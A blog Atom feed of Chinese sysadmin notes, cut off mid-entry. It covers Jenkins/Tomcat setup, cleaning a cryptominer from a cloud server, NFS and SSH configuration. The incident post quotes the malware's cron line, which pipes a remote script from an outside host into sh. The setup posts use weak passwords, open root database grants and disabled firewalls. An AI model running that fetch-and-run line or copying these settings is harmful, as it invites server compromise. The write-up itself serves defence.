@@ -1,0 +1,523 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+  <title>J.W</title>
+  
+  <subtitle>朝花夕拾</subtitle>
+  <link href="/atom.xml" rel="self"/>
+  
+  <link href="http://jetwang99.github.io/"/>
+  <updated>2018-01-24T08:43:37.089Z</updated>
+  <id>http://jetwang99.github.io/</id>
+  
+  <author>
+    <name>J.W</name>
+    
+  </author>
+  
+  <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Jenkins安装配置</title>
+    <link href="http://jetwang99.github.io/2017/10/14/setup-jenkins-with-delegate-to-servlet-container/"/>
+    <id>http://jetwang99.github.io/2017/10/14/setup-jenkins-with-delegate-to-servlet-container/</id>
+    <published>2017-10-14T08:36:48.000Z</published>
+    <updated>2018-01-24T08:43:37.089Z</updated>
+    
+    <content type="html"><![CDATA[<p>Jenkins的安装配置备忘</p><h3 id="master-setup"><a href="#master-setup" class="headerlink" title="master setup"></a>master setup</h3><h4 id="1-install-mysql"><a href="#1-install-mysql" class="headerlink" title="1, install mysql"></a>1, install mysql</h4><pre><code>use mysql;SET PASSWORD FOR &apos;root&apos;@&apos;%&apos;=PASSWORD(&apos;Mysql123&apos;);grant all privileges on *.* to root@&quot;%&quot; identified by &quot;Mysql123&quot;;mysqladmin -u root password oldpass &quot;newpass&quot;</code></pre><a id="more"></a><h4 id="2-install-jdk-and-tomcat"><a href="#2-install-jdk-and-tomcat" class="headerlink" title="2, install jdk and tomcat"></a>2, install jdk and tomcat</h4><p>vi ~/.bashrc</p><pre><code>alias l=&quot;ls -l&quot;export JAVA_HOME=/var/java/jdk1.8.0_121export PATH=$JAVA_HOME/bin:$PATHexport CLASSPATH=.:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar</code></pre><h4 id="3-configure-mysql"><a href="#3-configure-mysql" class="headerlink" title="3, configure mysql"></a>3, configure mysql</h4><p>create database and tables</p><pre><code>CREATE DATABASE jenkins DEFAULT CHARACTER SET utf8 COLLATE utf8_general_ci;set character_set_client=utf8;set character_set_server=utf8;set character_set_connection=utf8;set character_set_database=utf8;set character_set_results=utf8;set collation_connection=utf8_general_ci;set collation_database=utf8_general_ci;set collation_server=utf8_general_ci;use jenkins;CREATE TABLE users (user_name varchar(10) NOT NULL,user_pass varchar(250) NOT NULL,PRIMARY KEY (user_name)) ENGINE=InnoDB DEFAULT CHARSET=utf8;CREATE TABLE roles (role_name varchar(10) NOT NULL PRIMARY KEY) ENGINE=InnoDB DEFAULT CHARSET=utf8;insert into roles(role_name) values (&apos;admin&apos;);insert into roles(role_name) values (&apos;developer&apos;);insert into roles(role_name) values (&apos;reviewer&apos;);CREATE TABLE user_roles (user_name varchar(10) NOT NULL,role_name varchar(10) NOT NULL,primary key (user_name, role_name)) ENGINE=InnoDB DEFAULT CHARSET=utf8;</code></pre><p>digest password and insert data</p><pre><code>$TOMCAT_HOME/bin/digest.sh -a &quot;SHA-512&quot; -i 1000 -s 16 -k 256 -h &quot;org.apache.catalina.realm.MessageDigestCredentialHandler&quot; &lt;password&gt;insert into user_roles(user_name,role_name) values (&quot;admin&quot;,&quot;admin&quot;);insert into users(user_name,user_pass) values (&quot;admin&quot;,&quot;generated long password string&quot;);    </code></pre><h4 id="4-configure-tomcat"><a href="#4-configure-tomcat" class="headerlink" title="4, configure tomcat"></a>4, configure tomcat</h4><p>put mysql driver to tomcat lib directory</p><pre><code>➜ lib pwd/data/apache-tomcat-8.5.15/lib➜ lib ls -l mysql-connector-java-5.1.26-bin.jar -rwxr-xr-x. 1 jenkins jenkins 855948 7月 24 2013 mysql-connector-java-5.1.26-bin.jar</code></pre><p>/data/apache-tomcat-8.5.15/conf/tomcat-users.xml</p><pre><code>&lt;role rolename=&quot;manager-gui&quot;/&gt;&lt;user username=&quot;admin&quot; password=&quot;admin&quot; roles=&quot;manager-gui&quot;/&gt;</code></pre><p>/data/apache-tomcat-8.5.15/conf/context.xml</p><pre><code>&lt;Resources cachingAllowed=&quot;true&quot; cacheMaxSize=&quot;100000&quot; /&gt;</code></pre><p>enable remote access for tomcat admin, webapps/manager/META-INF/context.xml</p><pre><code>&lt;Context antiResourceLocking=&quot;false&quot; privileged=&quot;true&quot; &gt;  &lt;!--  &lt;Valve className=&quot;org.apache.catalina.valves.RemoteAddrValve&quot;         allow=&quot;192\.\d+\.\d+\.\d+|::1|0:0:0:0:0:0:0:1&quot; /&gt;  --&gt;&lt;/Context&gt;</code></pre><p>update server.xml for mysql connection</p><pre><code>&lt;Realm className=&quot;org.apache.catalina.realm.LockOutRealm&quot;&gt;    &lt;Realm className=&quot;org.apache.catalina.realm.UserDatabaseRealm&quot;                resourceName=&quot;UserDatabase&quot;/&gt;    &lt;Realm className=&quot;org.apache.catalina.realm.JDBCRealm&quot;        driverName=&quot;org.gjt.mm.mysql.Driver&quot;        connectionURL=&quot;jdbc:mysql://localhost:3306/jenkins?user=root&amp;amp;password=yourpassword&quot;        userTable=&quot;users&quot; userNameCol=&quot;user_name&quot; userCredCol=&quot;user_pass&quot;        userRoleTable=&quot;user_roles&quot; roleNameCol=&quot;role_name&quot;&gt;        &lt;!-- $TOMCAT_HOME/bin/digest.sh -a &quot;SHA-512&quot; -i 1000 -s 16 -k 256 -h &quot;org.apache.catalina.realm.MessageDigestCredentialHandler&quot; admin --&gt;        &lt;CredentialHandler className=&quot;org.apache.catalina.realm.MessageDigestCredentialHandler&quot;                algorithm=&quot;SHA-512&quot;                iterations=&quot;1000&quot;                keyLength=&quot;256&quot;                saltLength=&quot;16&quot; /&gt;    &lt;/Realm&gt; &lt;/Realm&gt;</code></pre><p>Jenkins with tomcat + MySQL as user database</p><pre><code>Jenkins - Configure Global Security - Access Control - Security Realm - Delegate by servlet container                                                       Authorization - Role-Based Strategy</code></pre><p>Capcha Chinese Charactor issue fix: copy fonts to $JAVA_HOME/jre/lib/fonts, restart tomcat to make it work</p><h4 id="5-user-and-ssh-key-setup"><a href="#5-user-and-ssh-key-setup" class="headerlink" title="5, user and ssh key setup"></a>5, user and ssh key setup</h4><pre><code>groupadd jenkinsuseradd jenkins -g jenkinssudo passwd jenkinsssh-keygen -b 2048 -t rsassh-copy-id -i .ssh/id_rsa.pub jenkins@10.0.0.5chage -M 99999 jenkinschage -l jenkins</code></pre><h4 id="6-jenkins-install-and-initialization"><a href="#6-jenkins-install-and-initialization" class="headerlink" title="6, jenkins install and initialization"></a>6, jenkins install and initialization</h4><p>access <a href="http://10.0.0.3:8081/jenkins/credentials/store/system/domain/_/" target="_blank" rel="noopener">http://10.0.0.3:8081/jenkins/credentials/store/system/domain/_/</a> and click “Add Credentials”, choose “SSH Username with private key” and fill<br>username: jenkins<br>Private Key    - Enter directly: that is jenkins master user(jenkins)’s ssh private key</p><h3 id="slave-setup"><a href="#slave-setup" class="headerlink" title="slave setup"></a>slave setup</h3><h4 id="install-jdk-and-maven"><a href="#install-jdk-and-maven" class="headerlink" title="install jdk and maven"></a>install jdk and maven</h4><p>/etc/profile</p><pre><code>export JAVA_HOME=/data/jdk1.8.0_91export PATH=/usr/local/nginx/sbin:/usr/local/php/bin:/usr/local/apache/bin:/usr/local/mariadb/bin:$JAVA_HOME/bin:$PATHexport CLASSPATH=.:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar</code></pre><p>/home/jenkins/.m2/settings.xml</p><pre><code>&lt;mirror&gt;    &lt;id&gt;yourcompany-nexus&lt;/id&gt;    &lt;mirrorOf&gt;*&lt;/mirrorOf&gt;    &lt;name&gt;yourcompany-nexus&lt;/name&gt;    &lt;url&gt;http://120.76.xx.yy:8081/nexus/content/groups/public&lt;/url&gt;&lt;/mirror&gt;&lt;mirror&gt;    &lt;id&gt;nexus-aliyun&lt;/id&gt;    &lt;mirrorOf&gt;*&lt;/mirrorOf&gt;    &lt;name&gt;Nexus aliyun&lt;/name&gt;    &lt;url&gt;http://maven.aliyun.com/nexus/content/groups/public&lt;/url&gt;&lt;/mirror&gt;</code></pre><h3 id="install-fpm"><a href="#install-fpm" class="headerlink" title="install fpm"></a>install fpm</h3><p>Some issue:</p><pre><code>gem install fpmERROR:  Loading command: install (LoadError)    no such file to load -- zlibERROR:  While executing gem ... (NameError)    uninitialized constant Gem::Commands::InstallCommand</code></pre><p>Fix:</p><pre><code>yum install zlib-develyum install opensslmake clean./configure --with-openssl-dir=/usr/local/opensslcd ext/zlibruby ./extconf.rbcd ..makemake install</code></pre><p>Shift to ruby china source:</p><pre><code>gem sources --add http://gems.ruby-china.org/ --remove https://rubygems.org/gem sources -l</code></pre><h3 id="build-package"><a href="#build-package" class="headerlink" title="build package"></a>build package</h3><pre><code>cat&gt;./pre_install.sh&lt;&lt;EOF#!/bin/sh. /etc/profilehost=\$(hostname -s)echo &quot;\$host&quot;tomcat_dir=/data/tomcat7/tomcat7081ps -ef|grep \$tomcat_dir | grep -v grep |awk &apos;{print \$2}&apos; | xargs kill -9rm -rf \$tomcat_dir/webapps/carManage/rm -rf \$tomcat_dir/work/* \$tomcat_dir/temp/*exit 0EOFcat&gt;./post_install.sh&lt;&lt;EOF#!/bin/sh##this script execute after  rpm packege install. /etc/profilehost=\$(hostname -s)tomcat_dir=/data/tomcat7/tomcat7081echo &quot;\$host&quot;cd \$tomcat_dir/binchmod +x ./*.shchown -R tomcat:tomcat \$tomcat_dir\webappssudo -u tomcat ./startup.sh &amp;exit 0EOFmkdir -p data/tomcat7/tomcat7081/webappsmv carManage/target/carManage.war data/tomcat7/tomcat7081/webapps//usr/local/bin/fpm -s dir -t rpm -n &quot;carManage&quot; -v 1.0.0.$BUILD_NUMBER --pre-install ./pre_install.sh --post-install ./post_install.sh datasudo rpm -ivh --force --nodeps `ls -rt /home/jenkins/carManage* | tail -n 1`</code></pre><h3 id="deploy-server-setting"><a href="#deploy-server-setting" class="headerlink" title="deploy server setting"></a>deploy server setting</h3><pre><code>Cmnd_Alias DEPLOY = /bin/rpm *Defaults:jenkins !requirettyjenkins     ALL=NOPASSWD:DEPLOY</code></pre>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;Jenkins的安装配置备忘&lt;/p&gt;
+&lt;h3 id=&quot;master-setup&quot;&gt;&lt;a href=&quot;#master-setup&quot; class=&quot;headerlink&quot; title=&quot;master setup&quot;&gt;&lt;/a&gt;master setup&lt;/h3&gt;&lt;h4 id=&quot;1-install-mysql&quot;&gt;&lt;a href=&quot;#1-install-mysql&quot; class=&quot;headerlink&quot; title=&quot;1, install mysql&quot;&gt;&lt;/a&gt;1, install mysql&lt;/h4&gt;&lt;pre&gt;&lt;code&gt;use mysql;
+SET PASSWORD FOR &amp;apos;root&amp;apos;@&amp;apos;%&amp;apos;=PASSWORD(&amp;apos;Mysql123&amp;apos;);
+grant all privileges on *.* to root@&amp;quot;%&amp;quot; identified by &amp;quot;Mysql123&amp;quot;;
+
+mysqladmin -u root password oldpass &amp;quot;newpass&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+    
+    </summary>
+    
+      <category term="技术" scheme="http://jetwang99.github.io/categories/%E6%8A%80%E6%9C%AF/"/>
+    
+    
+      <category term="Jenkins" scheme="http://jetwang99.github.io/tags/Jenkins/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>阿里云服务器被发现挖矿程序后的处理</title>
+    <link href="http://jetwang99.github.io/2017/10/14/aliyun-server-was-hajacked-for-mining-fix/"/>
+    <id>http://jetwang99.github.io/2017/10/14/aliyun-server-was-hajacked-for-mining-fix/</id>
+    <published>2017-10-14T08:12:58.000Z</published>
+    <updated>2018-01-24T08:30:24.787Z</updated>
+    
+    <content type="html"><![CDATA[<p>巡检发现阿里云一台ECS的CPU占用过高，而该进程是 /tmp 目录下，且进程名称似乎是自动生成的。初步判断被黑后紧急Google发现有类似案例发生在aws上面。这次操作忘记保留现场了，所以简要记录如下：</p><a id="more"></a><p>案例：</p><p>I found the solution to removing minerd. I was lucky enough to find the actual script that was used to infect my server. All I had to do was remove the elements placed by this script. On monkeyoto’s suggestion, I blocked all communication with the mining pool server.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">iptables -A INPUT -s xmr.crypto-pool.fr -j DROP</span><br><span class="line">iptables -A OUTPUT -d xmr.crypto-pool.fr -j DROP</span><br></pre></td></tr></table></figure><p>Removed the cron <em>/15 </em> <em> </em> * curl -fsSL <a href="https://r.chanstring.com/api/report?pm=0706" target="_blank" rel="noopener">https://r.chanstring.com/api/report?pm=0706</a> | sh from /var/spool/cron/root and /var/spool/cron/crontabs/root<br>Removed the directory /opt/yam<br>Removed /root/.ssh/KHK75NEOiq<br>Deleted the files /opt/minerd and /opt/KHK75NEOiq33<br>Stopped the minerd process - pkill minerd.<br>Stopped lady - service lady stop.<br>I ran ps -eo pcpu,args –sort=-%cpu | head, top -bn2 |sed -n ‘7,25’p and ps aux | grep minerd after that and the malware was nowhere to be seen.</p><p>I still need to figure out how it gained access into the system but I was able to disable it this way.</p><p>具体清理步骤如下：</p><h4 id="1，踢人"><a href="#1，踢人" class="headerlink" title="1，踢人"></a>1，踢人</h4><p>命令格式：pkill -kill -t tty<br>解释：<br>pkill -kill -t 　踢人命令<br>tty　所踢用户的tty<br>比如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pkill -kill -t pts/2</span><br></pre></td></tr></table></figure></p><h4 id="2-大扫除"><a href="#2-大扫除" class="headerlink" title="2, 大扫除"></a>2, 大扫除</h4><p>结果发现被自动拉起，这时候马上查看 crontab 果然有诡异设置，尝试删除crontab中的条目，发现无法保存，报错类似：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@X [/tmp]# crontab -e</span><br><span class="line">crontab: installing new crontab</span><br><span class="line">crontab: error renaming /var/spool/cron/tmp.XXXXDSGEDV to /var/spool/cron/root</span><br><span class="line">rename: Operation not permitted</span><br><span class="line">crontab: edits left in /tmp/crontab.xO3YcB</span><br></pre></td></tr></table></figure><p>解决办法：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lsattr /var/spool/cron/root</span><br><span class="line">chattr -aui /var/spool/cron/root</span><br></pre></td></tr></table></figure></p><h4 id="3，改密码并加强安全设置"><a href="#3，改密码并加强安全设置" class="headerlink" title="3，改密码并加强安全设置"></a>3，改密码并加强安全设置</h4><p>review sudo user, review /etc/ssh/sshd_config setting</p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;巡检发现阿里云一台ECS的CPU占用过高，而该进程是 /tmp 目录下，且进程名称似乎是自动生成的。初步判断被黑后紧急Google发现有类似案例发生在aws上面。这次操作忘记保留现场了，所以简要记录如下：&lt;/p&gt;
+    
+    </summary>
+    
+      <category term="技术" scheme="http://jetwang99.github.io/categories/%E6%8A%80%E6%9C%AF/"/>
+    
+    
+      <category term="安全" scheme="http://jetwang99.github.io/tags/%E5%AE%89%E5%85%A8/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>nfs权限问题</title>
+    <link href="http://jetwang99.github.io/2016/10/26/nfs-permission/"/>
+    <id>http://jetwang99.github.io/2016/10/26/nfs-permission/</id>
+    <published>2016-10-26T03:44:38.000Z</published>
+    <updated>2018-01-24T08:30:24.805Z</updated>
+    
+    <content type="html"><![CDATA[<h4 id="配置服务器"><a href="#配置服务器" class="headerlink" title="配置服务器"></a>配置服务器</h4><h5 id="创建需要共享的文件夹"><a href="#创建需要共享的文件夹" class="headerlink" title="创建需要共享的文件夹"></a>创建需要共享的文件夹</h5><p>mkdir doc_share</p><h5 id="编辑exports文件"><a href="#编辑exports文件" class="headerlink" title="编辑exports文件"></a>编辑exports文件</h5><p>vim /etc/exports<br>/doc_share 192.168.2.131/255.255.255.0(rw,sync)</p><h5 id="重启相关服务"><a href="#重启相关服务" class="headerlink" title="重启相关服务"></a>重启相关服务</h5><p>/etc/init.d/portmap restart<br>/etc/init.d/nfs restart</p><a id="more"></a><h5 id="设置自启动"><a href="#设置自启动" class="headerlink" title="设置自启动"></a>设置自启动</h5><p>chkconfig nfs on<br>chkconfig portmap on</p><h5 id="安全设置"><a href="#安全设置" class="headerlink" title="安全设置"></a>安全设置</h5><p>/etc/init.d/iptables stop<br>chkconfig iptables off<br>system-config-selinux</p><h5 id="检查配置"><a href="#检查配置" class="headerlink" title="检查配置"></a>检查配置</h5><p>[root@rac1 /]# exportfs -rv<br>exporting 192.168.2.131/255.255.255.0:/doc_share</p><h4 id="试着在本机看能否加载"><a href="#试着在本机看能否加载" class="headerlink" title="试着在本机看能否加载"></a>试着在本机看能否加载</h4><p>mount 192.168.2.131:/doc_share /mnt</p><p>[root@rac1 doc_share]# echo aa&gt;aa.txt<br>[root@rac1 doc_share]# ls<br>aa.txt<br>[root@rac1 /]# cd /mnt<br>[root@rac1 mnt]# ls<br>aa.txt</p><h4 id="客户端测试"><a href="#客户端测试" class="headerlink" title="客户端测试"></a>客户端测试</h4><h5 id="手工mount"><a href="#手工mount" class="headerlink" title="手工mount:"></a>手工mount:</h5><p>mount -o nolock 192.168.2.131:/doc_share /mnt<br>这个时候可以看到在节点1上内容了.<br>[root@rac2 mnt]# cd /mnt<br>[root@rac2 mnt]# ls<br>aa.txt</p><h5 id="自动mount"><a href="#自动mount" class="headerlink" title="自动mount:"></a>自动mount:</h5><p>编辑fstab文件，实现开机自动挂载<br>mount -t nfs IP:/目录 挂载到的目录<br>(此为临时挂载)<br>如：mount -t nfs 192.168.0.9:/doc /doc<br>vim /etc/fstab 添加如下内容<br>192.168.2.131:/doc_share /mnt nfs defaults 0 0</p><h4 id="相关的一些命令"><a href="#相关的一些命令" class="headerlink" title="相关的一些命令:"></a>相关的一些命令:</h4><h5 id="showmout命令对于NFS的操作和查错有很大的帮助"><a href="#showmout命令对于NFS的操作和查错有很大的帮助" class="headerlink" title="showmout命令对于NFS的操作和查错有很大的帮助."></a>showmout命令对于NFS的操作和查错有很大的帮助.</h5><p>showmout </p><p>-a:这个参数是一般在NFS ERVER上使用,是用来显示已经mount上本机nfs目录的cline机器.<br>-e:显示指定的NFS SERVER上export出来的目录.<br>例如：<br>showmount -e 192.168.0.30 </p><p>Export list for localhost:<br>/tmp <em><br>/home/linux </em>.linux.org </p><p>/home/public (everyone)<br>/home/test 192.168.0.100</p><h5 id="exportfs命令"><a href="#exportfs命令" class="headerlink" title="exportfs命令:"></a>exportfs命令:</h5><p>如果我们在启动了NFS之后又修改了/etc/exports,是不是还要重新启动nfs呢？这个时候我们就可以用exportfs命令来使改动立刻生效，该命令格式如下:<br>exportfs<br>[-aruv]<br>-a ：全部mount或者unmount /etc/exports中的内容<br>-r ：重新mount /etc/exports中分享出来的目录<br>-u ：umount 目录<br>-v ：在 export 的时候,将详细的信息输出到屏幕上.</p><p>具体例子:</p><p>[root @test root]# exportfs -rv<br>exporting<br>192.168.0.100:/home/test<br>exporting 192.168.0.<em>:/home/public<br>exporting </em>.the9.com:/home/linux<br>exporting <em>:/home/public<br>exporting </em>:/tmp </p><p>reexporting 192.168.0.100:/home/test to kernel</p><p>exportfs -au 全部都卸载了</p><h4 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h4><p>今天在机器上配置NFS文件系统，在/etc/exports中加入以下信息：<code>/testfs 10.0.0.0/8(rw)</code><br>重启NFS服务以后，在客户机通过<code>mount -o rw -t nfs 10.214.54.29:/testfs /rd1</code>命令将网络文件mount到本地。执行完成之后，目录是可以访问了，但无法写入。感觉有点奇怪，明明在命令中指定可以写入了。于是到网上搜索资料，发现exports目录权限中，有这么一个参数no_root_squash。其作用是：登入 NFS 主机使用分享目录的使用者，如果是 root 的话，那么对于这个分享的目录来说，他就具有root的权限！。默认情况使用的是相反参数root_squash：在登入 NFS 主机使用分享之目录的使用者如果是 root，那么这个使用者的权限将被压缩成为匿名使用者，通常他的UID与GID都会变成 nobody 那个身份。<br>因为我的客户端是使用root登录的，自然权限被压缩为nobody了，难怪无法写入。将配置信息改为：<code>/testfs 10.0.0.0/8(rw,no_root_squash)</code><br>据说有点不安全，但问题是解决了。 </p><p>Exports文件中可以设定的参数主要有以下这些： </p><p>Ro 该主机对该共享目录有只读权限 </p><p>Rw 该主机对该共享目录有读写权限 </p><p>Root_squash 客户机用root用户访问该共享文件夹时，将root用户映射成匿名用户 </p><p>No_root_squash 客户机用root访问该共享文件夹时，不映射root用户 </p><p>All_squash 客户机上的任何用户访问该共享目录时都映射成匿名用户 </p><p>Anonuid 将客户机上的用户映射成指定的本地用户ID的用户 </p><p>Anongid 将客户机上的用户映射成属于指定的本地用户组ID </p><p>Sync 资料同步写入到内存与硬盘中 </p><p>Async 资料会先暂存于内存中，而非直接写入硬盘 </p><p>Insecure 允许从这台机器过来的非授权访问 </p><p>例如可以编辑/etc/exports为： </p><p><code>/ user01(rw) user02(rw,no_root_squash)</code> 表示共享服务器上的根目录(/)只有user01和user02两台主机可以访问，且有读写权限；user01主机用root用户身份访问时，将客户机的root用户映射成服务器上的匿名用户(root_squash,该参数为缺省参数)，相当于在服务器使用nobody用户访问目录；user02主机用root用户身份访问该共享目录时，不映射root用户(no_root_squash),即相当于在服务器上用root身份访问该目录 </p><p><code>/root/share/ 192.168.1.2(rw,insecure,sync,all_squash)</code> 表示共享服务器上的/root/share/目录只有192.168.1.2主机可以访问，且有读写权限；此主机用任何身份访问时，将客户机的用户都映射成服务器上的匿名用户(all_squash),相当于在服务器上用nobody用户访问该目录（若客户机要在该共享目录上保存文件（即写操作），则服务器上的nobody用户对该目录必须有写的权限） </p><p><code>/home/ylw/ *.test.com (rw,insecure,sync,all_squash)</code> 表示共享/home/ylw/目录，*.test.com域中所有的主机都可以访问该目录，且有读写权限 </p><p><code>/home/share/ .test.com (ro,sync,all_squash,anonuid=zh3,anongid=wa4)</code> 表示共享目录/home/share/，*.test.com域中的所有主机都可以访问，但只有只读的权限，所有用户都映射成服务器上的uid为zh3、gid为wa4的用户 </p><p>设定好后可以使用以下命令启动NFS: <code>service nfs restart</code></p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;h4 id=&quot;配置服务器&quot;&gt;&lt;a href=&quot;#配置服务器&quot; class=&quot;headerlink&quot; title=&quot;配置服务器&quot;&gt;&lt;/a&gt;配置服务器&lt;/h4&gt;&lt;h5 id=&quot;创建需要共享的文件夹&quot;&gt;&lt;a href=&quot;#创建需要共享的文件夹&quot; class=&quot;headerlink&quot; title=&quot;创建需要共享的文件夹&quot;&gt;&lt;/a&gt;创建需要共享的文件夹&lt;/h5&gt;&lt;p&gt;mkdir doc_share&lt;/p&gt;
+&lt;h5 id=&quot;编辑exports文件&quot;&gt;&lt;a href=&quot;#编辑exports文件&quot; class=&quot;headerlink&quot; title=&quot;编辑exports文件&quot;&gt;&lt;/a&gt;编辑exports文件&lt;/h5&gt;&lt;p&gt;vim /etc/exports&lt;br&gt;/doc_share 192.168.2.131/255.255.255.0(rw,sync)&lt;/p&gt;
+&lt;h5 id=&quot;重启相关服务&quot;&gt;&lt;a href=&quot;#重启相关服务&quot; class=&quot;headerlink&quot; title=&quot;重启相关服务&quot;&gt;&lt;/a&gt;重启相关服务&lt;/h5&gt;&lt;p&gt;/etc/init.d/portmap restart&lt;br&gt;/etc/init.d/nfs restart&lt;/p&gt;
+    
+    </summary>
+    
+      <category term="技术" scheme="http://jetwang99.github.io/categories/%E6%8A%80%E6%9C%AF/"/>
+    
+    
+      <category term="Linux" scheme="http://jetwang99.github.io/tags/Linux/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Windows中删除路径太长目录及文件</title>
+    <link href="http://jetwang99.github.io/2016/09/30/delete-long-path-in-windows/"/>
+    <id>http://jetwang99.github.io/2016/09/30/delete-long-path-in-windows/</id>
+    <published>2016-09-30T08:10:07.000Z</published>
+    <updated>2018-01-24T08:30:24.788Z</updated>
+    
+    <content type="html"><![CDATA[<p>用node的话，经常搞出这种路径超过Windows限制的情况而导致目录删不掉，网上说下面这个命令可以删除</p><p>在cmd命令行窗口中输入 </p><pre><code>robocopy empty_dir will_delete_dir /purge</code></pre><p>empty_dir 新建的空白目录<br>will_delete_dir 要删除的目录<br>注意中间的空格</p><p>自己搞了个powershell脚本，先把路径名字改短然后再删，也很方便</p><a id="more"></a><pre><code>$test=&apos;C:\test&apos;@&apos;删除Windows下面的目录时，有时候会提示路经过长无法删除，本脚本可以递归对目录下面的子目录和文件改名字让它变短本脚本可以多次运行&apos;@function renameFolder($global:path){    $items=@(Get-ChildItem -Path $global:path)      $global:newpath=@()        foreach($item in $items){        $global:num=$(Get-Random -minimum 100 -maximum 999)        if($item.PSIsContainer -eq $true){                                         Rename-Item $item.FullName $num -ErrorAction SilentlyContinue            $global:newpath+=Join-Path $global:path $num        }else{                     $temp = Join-Path $global:path $item            Rename-Item $temp $global:num -ErrorAction SilentlyContinue        }    }    foreach($new in $global:newpath){        if($new.PSIsContainer -eq $true){            renameFolder $new        }    }}renameFolder $test</code></pre>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;用node的话，经常搞出这种路径超过Windows限制的情况而导致目录删不掉，网上说下面这个命令可以删除&lt;/p&gt;
+&lt;p&gt;在cmd命令行窗口中输入 &lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;robocopy empty_dir will_delete_dir /purge
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;empty_dir 新建的空白目录&lt;br&gt;will_delete_dir 要删除的目录&lt;br&gt;注意中间的空格&lt;/p&gt;
+&lt;p&gt;自己搞了个powershell脚本，先把路径名字改短然后再删，也很方便&lt;/p&gt;
+    
+    </summary>
+    
+      <category term="技术" scheme="http://jetwang99.github.io/categories/%E6%8A%80%E6%9C%AF/"/>
+    
+    
+      <category term="Windows" scheme="http://jetwang99.github.io/tags/Windows/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>增加ssh无密码信任连接的安全性（转）</title>
+    <link href="http://jetwang99.github.io/2016/07/01/secure-ssh-trust-connection/"/>
+    <id>http://jetwang99.github.io/2016/07/01/secure-ssh-trust-connection/</id>
+    <published>2016-07-01T02:13:07.000Z</published>
+    <updated>2018-01-24T08:30:24.807Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="一般情况这样玩"><a href="#一般情况这样玩" class="headerlink" title="一般情况这样玩"></a>一般情况这样玩</h3><p>为了方便系统管理或者服务器运维自动化，我们通常要在服务器间做ssh无密码信任连接。</p><p>在服务器端创建密钥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t dsa</span><br></pre></td></tr></table></figure><p>一路回车，在~/.ssh下生成的id_rsa是私钥，id_rsa.pub是公钥。复制公钥到目标服务器，然后就可以无密码登录了：</p><p>自动化拷贝公钥到多台目标机器</p><a id="more"></a> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line">. /etc/init.d/functions</span><br><span class="line">for ip in 77 185 197 208</span><br><span class="line">do</span><br><span class="line"> expect fenfa_sshkey.exp ~/.ssh/id_dsa.pub 10.86.17.$ip</span><br><span class="line"> if [ $? -eq 0 ];then</span><br><span class="line">    echo &quot;$ip&quot; /bin/true</span><br><span class="line"> else</span><br><span class="line">    echo &quot;$ip&quot; /bin/false</span><br><span class="line"> fi</span><br><span class="line">done</span><br></pre></td></tr></table></figure><p>expect脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/expect</span><br><span class="line">set timeout 10</span><br><span class="line"></span><br><span class="line">if &#123; $argc != 2 &#125; &#123;</span><br><span class="line"> send_user &quot;usage: expect fenfa_sshkey.exp file host\n&quot;</span><br><span class="line"> exit</span><br><span class="line">&#125;</span><br><span class="line">#</span><br><span class="line">set file [lindex $argv 0]</span><br><span class="line">set host [lindex $argv 1]</span><br><span class="line">set user sa</span><br><span class="line">set psw yourpassword</span><br><span class="line"></span><br><span class="line">spawn ssh-copy-id -i $file -p 22 $user@$host</span><br><span class="line"></span><br><span class="line">expect &#123;</span><br><span class="line">    &quot;(yes/no)?&quot; &#123;</span><br><span class="line">        send &quot;yes\n&quot;</span><br><span class="line">        expect &quot;*password:*&quot; &#123;</span><br><span class="line">            send $psw</span><br><span class="line">            send &quot;\r&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &quot;*password:*&quot; &#123;</span><br><span class="line">        send $psw</span><br><span class="line">        send 